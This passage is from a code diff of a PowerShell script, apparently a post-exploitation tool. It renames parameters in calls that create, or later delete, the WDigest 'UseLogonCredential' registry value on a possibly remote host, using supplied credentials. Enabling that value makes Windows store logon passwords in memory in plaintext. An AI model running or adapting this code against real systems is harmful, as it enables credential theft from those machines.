-                    Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
+                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential'
                 }
             }
 
@@ -3469,12 +3535,12 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '0x1'
+                    Invoke-RegValueMod -Creds $Credential -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '0x1'
                 }
 
                 else
                 {
-                    Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue UseLogonCredential -RegData "0x1"
+                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey UseLogonCredential -RegValue "0x1"
                 }
             }
 
